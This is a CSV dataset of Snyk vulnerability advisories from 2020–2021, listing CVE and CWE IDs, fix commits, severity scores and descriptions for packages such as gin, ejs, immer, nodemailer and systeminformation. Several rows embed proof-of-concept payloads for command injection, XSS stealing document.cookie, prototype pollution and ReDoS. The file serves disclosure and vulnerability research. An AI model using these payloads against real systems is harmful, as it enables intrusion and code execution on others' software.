CVE-2020-28483,CWE-113,Snyk,https://security.snyk.io/vuln/SNYK-GOLANG-GITHUBCOMGINGONICGIN-1041736,20/01/2021,19/11/2020,https://github.com/gin-gonic/gin/commit/3b555a560534ca3114515c4b32737ba51b10392c,HTTP Response Splitting,https://api.github.com/repos/gin-gonic/gin/commits/3b555a560534ca3114515c4b32737ba51b10392c,Egor Seredin,4819888+agmt@users.noreply.github.com,gin,3b555a560534ca3114515c4b32737ba51b10392c,ClientIP: check every proxy for trustiness (#2844),Go,7.1,high,"github.com/gin-gonic/gin is a package that implements a HTTP web framework called gin.
Affected versions of this package are vulnerable to HTTP Response Splitting. When gin is exposed directly to the internet, a client's IP can be spoofed by setting the X-Forwarded-For header.",2021
CVE-2020-7795,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-GETNPMPACKAGEVERSION-1050390,20/01/2021,11/12/2020,https://github.com/hoperyy/get-npm-package-version/commit/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec,Command Injection,https://api.github.com/repos/hoperyy/get-npm-package-version/commits/40b1cf31a0607ea66f9e30a0c3af1383b52b2dec,DuLinRain,dulinrain@mail.hfut.edu.cn,get-npm-package-version,40b1cf31a0607ea66f9e30a0c3af1383b52b2dec,"feat: add defence to Command Injection

add defence to Command Injection",JavaScript,7.3,high,"Affected versions of this package are vulnerable to Command Injection via main function in index.js.
PoC
var a = require(""get-npm-package-version"");
a(""& touch JHU"");",2021
,CWE-94,Snyk,https://security.snyk.io/vuln/SNYK-JS-EJS-1049328,20/01/2021,09/12/2020,https://github.com/mde/ejs/commit/abaee2be937236b1b8da9a1f55096c17dda905fd,Arbitrary Code Injection,https://api.github.com/repos/mde/ejs/commits/abaee2be937236b1b8da9a1f55096c17dda905fd,mde,mde@fleegix.org,ejs,abaee2be937236b1b8da9a1f55096c17dda905fd,Sanitize filename for display,JavaScript,4.1,medium,"ejs is a popular JavaScript templating engine.
Affected versions of this package are vulnerable to Arbitrary Code Injection via the render and renderFile. If external input is flowing into the options parameter, an attacker is able run arbitrary code. This include the filename, compileDebug, and client option.",2021
CVE-2021-23326,CWE-77,Snyk,https://security.snyk.io/vuln/SNYK-JS-GRAPHQLTOOLSGITLOADER-1062543,20/01/2021,19/01/2021,https://github.com/ardatan/graphql-tools/commit/6a966beee8ca8b2f4adfe93318b96e4a5c501eac,Command Injection,https://api.github.com/repos/ardatan/graphql-tools/commits/6a966beee8ca8b2f4adfe93318b96e4a5c501eac,Dotan Simha,dotansimha@gmail.com,graphql-tools,6a966beee8ca8b2f4adfe93318b96e4a5c501eac,Fix vulnerability in git-loader: use execFile instead of exec (#2470),Markdown,5.5,medium,Affected versions of this package are vulnerable to Command Injection. The use of exec and execSync in packages/loaders/git/src/load-git.ts allows arbitrary command injection. As this is a dev tool input is generally controlled by the user that executes the command.,2021
CVE-2020-28477,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-IMMER-1019369,19/01/2021,18/10/2020,https://github.com/immerjs/immer/commit/da2bd4fa0edc9335543089fe7d290d6a346c40c5,Prototype Pollution,https://api.github.com/repos/immerjs/immer/commits/da2bd4fa0edc9335543089fe7d290d6a346c40c5,Michel Weststrate,mweststrate@gmail.com,immer,da2bd4fa0edc9335543089fe7d290d6a346c40c5,"fix: Fixed security issue #738: prototype pollution possible when applying patches CVE-2020-28477

See: CVE-2020-28477 / SNYK-JS-IMMER-1019369
https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-28477
https://snyk.io/vuln/SNYK-JS-IMMER-1019369",JavaScript,7.5,high,"immer is a package that allows you to create your next immutable state by mutating the current one.
Affected versions of this package are vulnerable to Prototype Pollution.
PoC
const {applyPatches, enablePatches} = require(""immer"");
enablePatches();
let obj = {};
console.log(""Before : "" + obj.polluted);
applyPatches({}, [ { op: 'add', path: [ ""__proto__"", ""polluted"" ], value: ""yes"" } ]);
// applyPatches({}, [ { op: 'replace', path: [ ""__proto__"", ""polluted"" ], value: ""yes"" } ]);
console.log(""After : "" + obj.polluted);",2021
CVE-2020-28472,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-AWSSDK-1059424,14/01/2021,14/01/2021,https://github.com/aws/aws-sdk-js-v3/commit/a209082dff913939672bb069964b33aa4c5409a9,Prototype Pollution,https://api.github.com/repos/aws/aws-sdk-js-v3/commits/a209082dff913939672bb069964b33aa4c5409a9,AllanZhengYP,zheallan@amazon.com,aws-sdk-js-v3,a209082dff913939672bb069964b33aa4c5409a9,"fix(shared-ini-file-loader): ignore prohibited profile name (#1764)

* fix(shared-ini-file-loader): ignore prohibited profile name

* fix: address feedbacks",TypeScript,7.3,high,"Affected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with loadSharedConfigFiles , they will pollute the prototype on the application. This can be exploited further depending on the context.",2021
CVE-2020-28472,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-AWSSDKSHAREDINIFILELOADER-1049304,14/01/2021,14/01/2021,https://github.com/aws/aws-sdk-js-v3/commit/a209082dff913939672bb069964b33aa4c5409a9,Prototype Pollution,https://api.github.com/repos/aws/aws-sdk-js-v3/commits/a209082dff913939672bb069964b33aa4c5409a9,AllanZhengYP,zheallan@amazon.com,aws-sdk-js-v3,a209082dff913939672bb069964b33aa4c5409a9,"fix(shared-ini-file-loader): ignore prohibited profile name (#1764)

* fix(shared-ini-file-loader): ignore prohibited profile name

* fix: address feedbacks",TypeScript,7.3,high,"Affected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with loadSharedConfigFiles , they will pollute the prototype on the application. This can be exploited further depending on the context.",2021
CVE-2020-28458,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DATATABLESNET-1016402,17/12/2020,07/10/2020,https://github.com/DataTables/DataTablesSrc/commit/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03,Prototype Pollution,https://api.github.com/repos/DataTables/DataTablesSrc/commits/a51cbe99fd3d02aa5582f97d4af1615d11a1ea03,Allan Jardine,allan.jardine@sprymedia.co.uk,DataTablesSrc,a51cbe99fd3d02aa5582f97d4af1615d11a1ea03,"Fix: Possible prototype pollution if `constructor` were used in a data property name

https://github.com/418sec/huntr/pull/827",JavaScript,7.3,high,"datatables.net is a DataTables for jQuery
Affected versions of this package are vulnerable to Prototype Pollution due to an incomplete fix for https://snyk.io/vuln/SNYK-JS-DATATABLESNET-598806.",2020
CVE-2020-28457,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SCARTCORE-1047342,15/12/2020,30/11/2020,https://github.com/s-cart/s-cart/commit/4406d407ad363ee7e4795ee290c9d2430b0413f8,Cross-site Scripting (XSS),https://api.github.com/repos/s-cart/s-cart/commits/4406d407ad363ee7e4795ee290c9d2430b0413f8,Lanh Le,lanhktc@gmail.com,s-cart,4406d407ad363ee7e4795ee290c9d2430b0413f8,Hot fix error xss,PHP,7.2,high,"s-cart/core is a free Laravel e-commerce for business.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The search functionality of the admin dashboard in core/src/Admin/Controllers/AdminOrderController.php#index is vulnerable to XSS.
##PoC: 
[host]/sc_admin/order?keyword=%22%3E%3Cscript%3Ealert%28document.cookie%29%3C%2Fscript%3E",2020
CVE-2020-26274,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-SYSTEMINFORMATION-1050436,14/12/2020,11/12/2020,https://github.com/sebhildebrandt/systeminformation/commit/1faadcbf68f1b1fdd5eb2054f68fc932be32ac99,Command Injection,https://api.github.com/repos/sebhildebrandt/systeminformation/commits/1faadcbf68f1b1fdd5eb2054f68fc932be32ac99,Sebastian Hildebrandt,hildebrandt@plus-innovations.com,systeminformation,1faadcbf68f1b1fdd5eb2054f68fc932be32ac99,inetLatency() command injection vulnaribility fix,Markdown,8.2,high,"systeminformation is a simple system and OS information library.
Affected versions of this package are vulnerable to Command Injection. The sanitizeShellString function does not sanitize quotation marks, which could be leveraged by an attacker to execute arbitrary commands. 
PoC
const si = require('systeminformation');
si.inetLatency(""`<OS command>`"");",2020
CVE-2020-28471,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968,14/01/2021,14/01/2021,https://github.com/steveukx/properties/commit/0877cc871db9865f58dd9389ce99e61be05380a5,Prototype Pollution,https://api.github.com/repos/steveukx/properties/commits/0877cc871db9865f58dd9389ce99e61be05380a5,Steve King,steve@mydev.co,properties,0877cc871db9865f58dd9389ce99e61be05380a5,"Test case covering the use of `__proto__` as a section name
Closes #40",JavaScript,7.3,high,"properties-reader is a Properties file reader for Node.js
Affected versions of this package are vulnerable to Prototype Pollution.",2021
CVE-2020-28451,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-IMAGETILER-1051029,06/01/2021,15/12/2020,https://github.com/MrP/image-tiler/commit/f4a0b13a4bf43655fc4013e04bbceaf77aecbeb8,Command Injection,https://api.github.com/repos/MrP/image-tiler/commits/f4a0b13a4bf43655fc4013e04bbceaf77aecbeb8,Victor Rodriguez,victor@wsdev.tech,image-tiler,f4a0b13a4bf43655fc4013e04bbceaf77aecbeb8,fix command injection vuln,JavaScript,9.8,critical,"image-tiler is a package that creates zoom tile pyramids from a large image. There are other packages very similar to this one, but none did exactly what I needed, so I made mine.
Affected versions of this package are vulnerable to Command Injection.
PoC
var tile = require(""image-tiler"").tile;
var tilePromise = tile(""& touch 1112"",""& touch 222"",""& touch 33"",{invertZoom:true});",2021
CVE-2020-28461,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-JSINI-1048970,29/12/2020,08/12/2020,https://github.com/Sdju/js-ini/commit/fa17efb7e3a7c9464508a254838d4c231784931e,Prototype Pollution,https://api.github.com/repos/Sdju/js-ini/commits/fa17efb7e3a7c9464508a254838d4c231784931e,zede,zede@ventumit.ru,js-ini,fa17efb7e3a7c9464508a254838d4c231784931e,refactoring and new functional,Config files,7.3,high,"js-ini is a parsing and serialize ini files
Affected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with parse , they will pollute the prototype on the application. This can be exploited further depending on the context.",2020
,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-INIREADER-1054843,29/12/2020,29/12/2020,https://github.com/Ajnasz/IniReader/commit/c260e4e9050c731dbdb88e1d2e23e851528d3d93,Prototype Pollution,https://api.github.com/repos/Ajnasz/IniReader/commits/c260e4e9050c731dbdb88e1d2e23e851528d3d93,Lajos Koszti,ajnasz@ajnasz.hu,IniReader,c260e4e9050c731dbdb88e1d2e23e851528d3d93,"Avoid polluting prototype

Set the output's prototype to null, so it won't change the
Object.prototype if an ini has __proto__ group",JavaScript,5.6,medium,"inireader is a small module for nodejs. You can parse .ini configuration files with it.
Affected versions of this package are vulnerable to Prototype Pollution. This vulnerability relates to the parse function is concentrating arrays. Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. 
PoC
Test.ini

[proto]
polluted = polluted
PoC.js
var iniReader = require('inireader');
console.log('Before:', {}.polluted);
// initialize
var parser = new iniReader.IniReader();
parser.load('./test.ini');
console.log('After:', {}.polluted);",2020
,CWE-185,Snyk,https://security.snyk.io/vuln/SNYK-JS-SEMVERREGEX-1047770,27/12/2020,22/11/2020,https://github.com/sindresorhus/semver-regex/commit/6baf2cc1d470c2fb63666bdebeef06822be7ba8c,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/sindresorhus/semver-regex/commits/6baf2cc1d470c2fb63666bdebeef06822be7ba8c,Sindre Sorhus,sindresorhus@gmail.com,semver-regex,6baf2cc1d470c2fb63666bdebeef06822be7ba8c,Fix regex catastrophic backtracking,JavaScript,4.3,medium,"semver-regex is a Regular expression for matching semver versions
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS).
PoC

// import of the vulnerable library
const semverRegex = require('semver-regex');
// import of measurement tools
const { PerformanceObserver, performance } = require('perf_hooks');

// config of measurements tools
const obs = new PerformanceObserver((items) => {
 console.log(items.getEntries()[0].duration);
 performance.clearMarks();
});
obs.observe({ entryTypes: ['measure'] });
// base version string
let version = ""v1.1.3-0a""
// Adding the evil code, resulting in string
// v1.1.3-0aa.aa.aa.aa.aa.aa.a…a.a""
for(let i=0; i < 20; i++) {
   version += ""a.a""
}
// produce a good version
// Parses well for the regex in milliseconds
let goodVersion = version + ""2""
// good version proof
performance.mark(""good before"")
const goodresult = semverRegex().test(goodVersion);
performance.mark(""good after"")
console.log(Good result: ${goodresult})
performance.measure('Good', 'good before', 'good after');
// create a bad/exploit version that is invalid due to the last $ sign
// will cause the nodejs engine to hang, if not, increase the a.a
// additions above a bit.
badVersion = version + ""aaaaaaa$""
// exploit proof
performance.mark(""bad before"")
const badresult = semverRegex().test(badVersion);
performance.mark(""bad after"")
console.log(Bad result: ${badresult})
performance.measure('Bad', 'bad before', 'bad after');",2020
CVE-2020-28460,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MULTIINI-1053229,21/12/2020,20/12/2020,https://github.com/evangelion1204/multi-ini/commit/6b2212b2ce152c19538a2431415f72942c5a1bde,Prototype Pollution,https://api.github.com/repos/evangelion1204/multi-ini/commits/6b2212b2ce152c19538a2431415f72942c5a1bde,Michael Iwersen,michael.iwersen@zalando.de,multi-ini,6b2212b2ce152c19538a2431415f72942c5a1bde,Fixed 2nd issue with prototype pollution,Markdown,5.6,medium,"multi-ini is an ini-file parser which supports multi line, multiple levels and arrays to get a maximum of compatibility with Zend config files.
Affected versions of this package are vulnerable to Prototype Pollution. It is possible to pollute an object's prototype by specifying the constructor.proto object as part of an array. This is a bypass of CVE-2020-28448.
PoC
$ cat payload.2.ini
[constructor]
prototype.polluted = polluted

$ cat poc.multi-ini.js
const ini = require('multi-ini');
console.log('Before:', {}.polluted);
var content = ini.read('payload.2.ini');
console.log('After:', {}.polluted);",2020
CVE-2020-28441,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-CONFCFGINI-1048973,13/12/2020,08/12/2020,https://github.com/loge5/conf-cfg-ini/commit/3a88a6c52c31eb6c0f033369eed40aa168a636ea,Prototype Pollution,https://api.github.com/repos/loge5/conf-cfg-ini/commits/3a88a6c52c31eb6c0f033369eed40aa168a636ea,Rolf Loges,loges.rolf@gmail.com,conf-cfg-ini,3a88a6c52c31eb6c0f033369eed40aa168a636ea,fix: prevent prototype pollution attack,JavaScript,7.3,high,"conf-cfg-ini is an encode and decode ini,conf,cfg files
Affected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with decode, they will pollute the prototype on the application. This can be exploited further depending on the context.
##PoC by Eugene Lim:
payload.ini
[__proto__]
polluted=polluted

poc.js:
var fs = require('fs')
var Config = require('conf-cfg-ini')

var config = new Config();
config.options.lineEnding = config.detectLineEnding(fs.readFileSync('./payload.ini', 'utf-8'));
var parsed = config.decode(fs.readFileSync('./payload.ini', 'utf-8'))
console.log(parsed)
console.log(parsed.proto)
console.log({}.proto)
console.log(polluted)

> node poc.js
{}
{ polluted: 'polluted' }
{ polluted: 'polluted' }
polluted",2020
CVE-2020-7790,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SPATIEBROWSERSHOT-1037064,13/12/2020,04/11/2020,https://github.com/spatie/browsershot/commit/8d4bcfb1ff609921007f3fc11d80fcdad35598ac,Arbitrary File Read,https://api.github.com/repos/spatie/browsershot/commits/8d4bcfb1ff609921007f3fc11d80fcdad35598ac,dr4gonw4ll,anand.namana@gmail.com,browsershot,8d4bcfb1ff609921007f3fc11d80fcdad35598ac,"local file patch (#440)

* local file patch

* Update browser.js

Co-authored-by: Freek Van der Herten <freek@spatie.be>",JavaScript,5.3,medium,"spatie/browsershot is a library for converting a webpage to an image or pdf using headless Chrome.
Affected versions of this package are vulnerable to Arbitrary File Read. By specifying a URL in the file:// protocol an attacker is able to include arbitrary files in the resultant PDF.",2020
CVE-2020-7792,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MOUT-1014544,13/12/2020,30/09/2020,https://github.com/mout/mout/commit/bd1821223989e815bc7dac1217bc7859777ce0bf,Prototype Pollution,https://api.github.com/repos/mout/mout/commits/bd1821223989e815bc7dac1217bc7859777ce0bf,Asjid Kalam,asjid.kalam@gmail.com,mout,bd1821223989e815bc7dac1217bc7859777ce0bf,fixed prototype pollution,JavaScript,7.5,high,"mout is a Modular Utilities
Affected versions of this package are vulnerable to Prototype Pollution. The deepFillIn function can be used to 'fill missing properties recursively', while the deepMixIn 'mixes objects into the target object, recursively mixing existing child objects as well'. In both cases, the key used to access the target object recursively is not checked.",2020
CVE-2020-35149,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-RXDB-1050985,13/12/2020,13/12/2020,https://github.com/aheckmann/mquery/commit/792e69fd0a7281a0300be5cade5a6d7c1d468ad4,Prototype Pollution,https://api.github.com/repos/aheckmann/mquery/commits/792e69fd0a7281a0300be5cade5a6d7c1d468ad4,Valeri Karpov,val@karpov.io,mquery,792e69fd0a7281a0300be5cade5a6d7c1d468ad4,fix(utils): avoid copying special properties like `__proto__` when merging and cloning,JavaScript,7.3,high,"rxdb is a RxDB (short for Reactive Database) is a NoSQL-database for JavaScript Applications like Websites, hybrid Apps, Electron-Apps, Progressive Web Apps and NodeJs.
Affected versions of this package are vulnerable to Prototype Pollution via the merge function within lib/utils.js.  Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. 
PoC
   require('./env').getCollection(function(err, collection) {
      assert.ifError(err);
      col = collection;
      done();
    });
    var payload = JSON.parse('{""__proto__"": {""polluted"": ""vulnerable""}}');
    var m = mquery(payload);
    console.log({}.polluted);
// The empty object {} will have a property called polluted which will print vulnerable",2020
CVE-2020-35149,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-MQUERY-1050858,13/12/2020,13/12/2020,https://github.com/aheckmann/mquery/commit/792e69fd0a7281a0300be5cade5a6d7c1d468ad4,Prototype Pollution,https://api.github.com/repos/aheckmann/mquery/commits/792e69fd0a7281a0300be5cade5a6d7c1d468ad4,Valeri Karpov,val@karpov.io,mquery,792e69fd0a7281a0300be5cade5a6d7c1d468ad4,fix(utils): avoid copying special properties like `__proto__` when merging and cloning,JavaScript,7.3,high,"mquery is an Expressive query building for MongoDB
Affected versions of this package are vulnerable to Prototype Pollution via the merge function within lib/utils.js.  Depending on if user input is provided, an attacker can overwrite and pollute the object prototype of a program. 
PoC
   require('./env').getCollection(function(err, collection) {
      assert.ifError(err);
      col = collection;
      done();
    });
    var payload = JSON.parse('{""__proto__"": {""polluted"": ""vulnerable""}}');
    var m = mquery(payload);
    console.log({}.polluted);
// The empty object {} will have a property called polluted which will print vulnerable",2020
CVE-2020-7793,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-JS-UAPARSERJS-1023599,13/12/2020,29/10/2020,https://github.com/faisalman/ua-parser-js/commit/6d1f26df051ba681463ef109d36c9cf0f7e32b18,Regular Expression Denial of Service (ReDoS),https://api.github.com/repos/faisalman/ua-parser-js/commits/6d1f26df051ba681463ef109d36c9cf0f7e32b18,Faisal Salman,f@faisalman.com,ua-parser-js,6d1f26df051ba681463ef109d36c9cf0f7e32b18,Fix ReDoS vulnerabilities reported by Snyk,JavaScript,7.5,high,"ua-parser-js is a lightweight JavaScript-based user-agent string parser.
Affected versions of this package are vulnerable to Regular Expression Denial of Service (ReDoS) in multiple regexes (see linked commit for more info).",2020
CVE-2020-7789,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODENOTIFIER-1035794,13/12/2020,04/11/2020,https://github.com/mikaelbr/node-notifier/commit/2d3927b200a0fd1721e8b8ad59f84f383d3f0e0a,Command Injection,https://api.github.com/repos/mikaelbr/node-notifier/commits/2d3927b200a0fd1721e8b8ad59f84f383d3f0e0a,Mikael Brevik,mikaelbre@gmail.com,node-notifier,2d3927b200a0fd1721e8b8ad59f84f383d3f0e0a,patch: fixes possible injection issue for notify-send,JavaScript,5.6,medium,"node-notifier is an A Node.js module for sending notifications on native Mac, Windows (post and pre 8) and Linux (or Growl as fallback)
Affected versions of this package are vulnerable to Command Injection. It allows an attacker to run arbitrary commands on Linux machines due to the options params not being sanitised when being passed an array.",2020
CVE-2020-7791,CWE-400,Snyk,https://security.snyk.io/vuln/SNYK-DOTNET-I18N-1050179,11/12/2020,11/12/2020,https://github.com/turquoiseowl/i18n/commit/c418e3345313dc896c1951d8c46ab0b9b12fcbd3,Denial of Service (DoS),https://api.github.com/repos/turquoiseowl/i18n/commits/c418e3345313dc896c1951d8c46ab0b9b12fcbd3,Martin Connell,martinc@topology.com,i18n,c418e3345313dc896c1951d8c46ab0b9b12fcbd3,FIX - NullReferenceException caused by bad langtag #387,C#,7.5,high,"i18n is a smart internationalization for ASP.NET-based web applications. The i18n library is designed to replace the use of .NET resources in favor of an easier, globally-recognized standard for localizing ASP.NET-based web applications. Supports ASP.NET MVC, ASP.NET Web API, ASP.NET WebMatrix / Web Pages and ASP.NET Web Forms.
Affected versions of this package are vulnerable to Denial of Service (DoS). Vulnerability arises out of insufficient handling of erroneous language tags in src/i18n/Concrete/TextLocalizer.cs and src/i18n/LocalizedApplication.cs.",2020
CVE-2020-7776,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-PHPOFFICEPHPSPREADSHEET-1048856,08/12/2020,19/11/2020,https://github.com/PHPOffice/PhpSpreadsheet/commit/0ed5b800be2136bcb8fa9c1bdf59abc957a98845,Cross-site Scripting (XSS),https://api.github.com/repos/PHPOffice/PhpSpreadsheet/commits/0ed5b800be2136bcb8fa9c1bdf59abc957a98845,Mark Baker,mark@lange.demon.co.uk,PhpSpreadsheet,0ed5b800be2136bcb8fa9c1bdf59abc957a98845,"Resolve XSS Vulnerability in the HTML Writer (#1719)

Resolve XSS Vulnerability in the HTML Writer",Markdown,7.1,high,"phpoffice/phpspreadsheet is a Spreadsheet engine that Read, Create and Write Spreadsheet documents in PHP .
Affected versions of this package are vulnerable to Cross-site Scripting (XSS). The library is vulnerable to XSS when creating an html output from an excel file by adding a comment on any cell. The root cause of this issue is within the HTML writer where user comments are concatenated as part of link and this is returned as HTML.
PoC
1. Setup a project folder on your local web server
2. Open project folder in terminal to run `composer require phpoffice/phpspreadsheet`
3. Create an excel file -> Insert Comment -> Insert this payload `<script>alert(1)</script>`
4. Move the excel file to the project dir
5. Create a php file with filename `convert-excel-to-html.php` -> Insert code below

<?php
require './vendor/autoload.php';
use PhpOffice\PhpSpreadsheet\IOFactory;
$filename = 'INSERT_YOUR_EXCEL_FILE_HERE';
$spreadsheet = IOFactory::load('./'.$filename);
$writer = IOFactory::createWriter($spreadsheet, 'Html');
$filename = 'testxss.html';
$writer->save($filename);",2020
CVE-2020-7788,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-INI-1048974,10/12/2020,08/12/2020,https://github.com/npm/ini/commit/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1,Prototype Pollution,https://api.github.com/repos/npm/ini/commits/56d2805e07ccd94e2ba0984ac9240ff02d44b6f1,isaacs,i@izs.me,ini,56d2805e07ccd94e2ba0984ac9240ff02d44b6f1,do not allow invalid hazardous string as section name,JavaScript,7.3,high,"ini is an An ini encoder/decoder for node
Affected versions of this package are vulnerable to Prototype Pollution. If an attacker submits a malicious INI file to an application that parses it with ini.parse, they will pollute the prototype on the application. This can be exploited further depending on the context.",2020
CVE-2020-28456,CWE-79,Snyk,https://security.snyk.io/vuln/SNYK-PHP-SCARTCORE-1047609,08/12/2020,01/12/2020,https://github.com/s-cart/core/commit/f4b2811293063a3a2bb497b2512d8a18bd202219,Cross-site Scripting (XSS),https://api.github.com/repos/s-cart/core/commits/f4b2811293063a3a2bb497b2512d8a18bd202219,Lanh Le,lanhktc@gmail.com,core,f4b2811293063a3a2bb497b2512d8a18bd202219,Escape data for front-end,PHP,6.3,medium,"s-cart/core is a free Laravel e-commerce for business.
Affected versions of this package are vulnerable to Cross-site Scripting (XSS) via the admin panel.",2020
CVE-2020-7780,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMSOFTWAREMILLAKKAHTTPSESSION-1046654,27/11/2020,10/03/2020,https://github.com/softwaremill/akka-http-session/commit/57f11663eecb84be03383d164f655b9c5f953b41,Cross-site Request Forgery (CSRF),https://api.github.com/repos/softwaremill/akka-http-session/commits/57f11663eecb84be03383d164f655b9c5f953b41,Jaroslaw Kijanowski,kijanowski@gmail.com,akka-http-session,57f11663eecb84be03383d164f655b9c5f953b41,Fix CSRF protection bypass #74,Scala,6.3,medium,"Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF). For older versions, endpoints protected by randomTokenCsrfProtection could be bypassed with an empty X-XSRF-TOKEN header and an empty XSRF-TOKEN cookie.",2020
CVE-2020-7780,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMSOFTWAREMILLAKKAHTTPSESSION-1046655,27/11/2020,10/03/2020,https://github.com/softwaremill/akka-http-session/commit/57f11663eecb84be03383d164f655b9c5f953b41,Cross-site Request Forgery (CSRF),https://api.github.com/repos/softwaremill/akka-http-session/commits/57f11663eecb84be03383d164f655b9c5f953b41,Jaroslaw Kijanowski,kijanowski@gmail.com,akka-http-session,57f11663eecb84be03383d164f655b9c5f953b41,Fix CSRF protection bypass #74,Scala,6.3,medium,"Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF). For older versions, endpoints protected by randomTokenCsrfProtection could be bypassed with an empty X-XSRF-TOKEN header and an empty XSRF-TOKEN cookie.",2020
CVE-2020-7780,CWE-352,Snyk,https://security.snyk.io/vuln/SNYK-JAVA-COMSOFTWAREMILLAKKAHTTPSESSION-1045352,27/11/2020,10/03/2020,https://github.com/softwaremill/akka-http-session/commit/57f11663eecb84be03383d164f655b9c5f953b41,Cross-site Request Forgery (CSRF),https://api.github.com/repos/softwaremill/akka-http-session/commits/57f11663eecb84be03383d164f655b9c5f953b41,Jaroslaw Kijanowski,kijanowski@gmail.com,akka-http-session,57f11663eecb84be03383d164f655b9c5f953b41,Fix CSRF protection bypass #74,Scala,6.3,medium,"Affected versions of this package are vulnerable to Cross-site Request Forgery (CSRF). For older versions, endpoints protected by randomTokenCsrfProtection could be bypassed with an empty X-XSRF-TOKEN header and an empty XSRF-TOKEN cookie.",2020
CVE-2020-7778,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-SYSTEMINFORMATION-1043753,25/11/2020,23/11/2020,https://github.com/sebhildebrandt/systeminformation/commit/73dce8d717ca9c3b7b0d0688254b8213b957f0fa#diff-970ae648187190f86bafc8f193b7538200eba164fad0674428b6487582c089cc,Prototype Pollution,https://api.github.com/repos/sebhildebrandt/systeminformation/commits/73dce8d717ca9c3b7b0d0688254b8213b957f0fa#diff-970ae648187190f86bafc8f193b7538200eba164fad0674428b6487582c089cc,Sebastian Hildebrandt,hildebrandt@plus-innovations.com,systeminformation,73dce8d717ca9c3b7b0d0688254b8213b957f0fa,security update (prototype pollution prevention),Markdown,9.0,critical,"systeminformation is a simple system and OS information library.
Affected versions of this package are vulnerable to Prototype Pollution. The attacker can overwrite the properties and functions of an object, which can lead to executing OS commands.
Note:
The fix for this vulnerability is insufficient, see CVE-2020-26245.",2020
CVE-2020-7772,CWE-1321,Snyk,https://security.snyk.io/vuln/SNYK-JS-DOCPATH-1011952,15/11/2020,23/09/2020,https://github.com/mrodrig/doc-path/commit/3e2bb168cf303bffcd7fae5f8d05e5300c1541c7,Prototype Pollution,https://api.github.com/repos/mrodrig/doc-path/commits/3e2bb168cf303bffcd7fae5f8d05e5300c1541c7,Mike Rodrigues,rodrigues.mi@husky.neu.edu,doc-path,3e2bb168cf303bffcd7fae5f8d05e5300c1541c7,Fix issue presented in #14,Config files,7.5,high,"doc-path is an A document path library for Node
Affected versions of this package are vulnerable to Prototype Pollution.
PoC
const path = require('doc-path');
let obj = {};
console.log(""Before : "" + obj.polluted);
path.setPath({}, '__proto__.polluted', ""yes"");
console.log(""After : "" + obj.polluted);
console.log(""After : "" + {}.polluted);",2020
CVE-2020-7769,CWE-78,Snyk,https://security.snyk.io/vuln/SNYK-JS-NODEMAILER-1038834,12/11/2020,11/11/2020,https://github.com/nodemailer/nodemailer/commit/ba31c64c910d884579875c52d57ac45acc47aa54,Command Injection,https://api.github.com/repos/nodemailer/nodemailer/commits/ba31c64c910d884579875c52d57ac45acc47aa54,Andris Reinman,andris@kreata.ee,nodemailer,ba31c64c910d884579875c52d57ac45acc47aa54,v6.4.16,Config files,8.6,high,"nodemailer is an Easy as cake e-mail sending from your Node.js applications
Affected versions of this package are vulnerable to Command Injection. Use of crafted recipient email addresses may result in arbitrary command flag injection in sendmail transport for sending mails.
PoC
-bi@example.com (-bi Initialize the alias database.)
-d0.1a@example.com (The option -d0.1 prints the version of sendmail and the options it was compiled with.)
-Dfilename@example.com (Debug output ffile)",2020
CVE-2020-7758,CWE-22,Snyk,https://security.snyk.io/vuln/SNYK-JS-BROWSERLESSCHROME-1023657,29/10/2020,29/10/2020,https://github.com/browserless/chrome/commit/848b87e5bea4f8473eea85261a5ff922d6ebd2b6,Path Traversal,https://api.github.com/repos/browserless/chrome/commits/848b87e5bea4f8473eea85261a5ff922d6ebd2b6,Joel Griffith,joel.griffith@elastic.co,chrome,848b87e5bea4f8473eea85261a5ff922d6ebd2b6,Ensure workspace files are _in_ the workspace DIR,TypeScript,7.5,high,"browserless-chrome is a web-service that allows for remote clients to connect, drive, and execute headless work; all inside of docker. It offers first-class integrations for puppeteer, playwright, selenium's webdriver, and a slew of handy REST APIs for doing more common work.
